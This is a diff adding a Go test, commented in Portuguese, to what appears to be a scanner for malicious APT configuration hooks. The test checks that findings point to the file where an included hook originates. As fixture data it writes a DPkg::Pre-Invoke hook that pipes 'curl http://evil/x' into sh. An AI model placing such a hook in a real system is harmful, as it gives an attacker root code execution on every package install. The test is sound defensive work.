@@ -104,3 +104,46 @@ func TestPkgFileModifiedApenasOpcaoNaoEhCritico(t *testing.T) {
 			sevPorArquivo[comHook.File])
 	}
 }
+
+// A evidência de um hook trazido por #include aponta para a ORIGEM, não para o
+// arquivo que fez o include — e o #include de diretório é resolvido.
+func TestHookIncluidoApontaOrigem(t *testing.T) {
+	raiz := t.TempDir()
+	dir := filepath.Join(raiz, "etc/apt/apt.conf.d")
+	incdir := filepath.Join(raiz, "opt/apt-extra")
+	for _, d := range []string{dir, incdir} {
+		if err := os.MkdirAll(d, 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	// 99x inclui um DIRETÓRIO; o hook mora num arquivo lá dentro.
+	if err := os.WriteFile(filepath.Join(dir, "99x"),
+		[]byte("#include \"/opt/apt-extra/\";\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(incdir, "hook"),
+		[]byte("DPkg::Pre-Invoke {\"curl http://evil/x | sh\";};\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	e := env.Probe(env.Options{Root: raiz, Version: "test"})
+	f := facts.Collect(e)
+	r := triggerExec.Run(triggerExec, f, e)
+
+	var apontouOrigem bool
+	for _, fd := range r.Findings {
+		for _, ev := range fd.Evidence {
+			if strings.Contains(ev, "arquivo: /opt/apt-extra/hook:") {
+				apontouOrigem = true
+			}
+			if strings.Contains(ev, "arquivo: /etc/apt/apt.conf.d/99x:") {
+				t.Errorf("a evidência aponta para o arquivo que INCLUIU, não para a "+
+					"origem do payload: %q", ev)
+			}
+		}
+	}
+	if !apontouOrigem {
+		t.Errorf("o hook do diretório incluído não foi detectado com a origem certa. "+
+			"Achados: %d", len(r.Findings))
+	}
+}
